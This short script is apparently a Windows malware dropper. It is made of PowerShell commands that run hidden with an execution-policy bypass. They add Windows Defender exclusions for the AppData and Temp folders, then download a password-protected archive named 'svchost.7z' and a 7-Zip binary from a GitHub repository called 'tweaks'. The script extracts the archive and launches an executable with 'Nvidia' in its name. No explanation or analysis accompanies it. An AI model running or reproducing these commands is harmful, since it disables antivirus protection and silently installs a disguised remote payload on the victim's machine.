powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA%'" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%TEMP%'" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA%\System'" >nul 2>&1
powershell -w h -c "$dir=\"$env:APPDATA\system\";mkdir $dir -Force|Out-Null;iwr 'https://github.com/fixingmanagment/tweaks/raw/refs/heads/main/svchost.7z' -OutFile \"$dir\svchost.7z\";iwr 'https://github.com/fixingmanagment/tweaks/raw/refs/heads/main/7z.exe' -OutFile \"$dir\7z.exe\";iwr 'https://github.com/fixingmanagment/tweaks/raw/refs/heads/main/7z.dll' -OutFile \"$dir\7z.dll\";Start-Process \"$dir\7z.exe\" -ArgumentList \"x `\"$dir\svchost.7z`\" -p@123456789@ -o`\"$dir`\" -y\" -Wait;$exe=Get-ChildItem -Path $dir -Filter '*.exe' | Where-Object Name -like '*Nvidia*';if ($exe) {Start-Process $exe.FullName}"
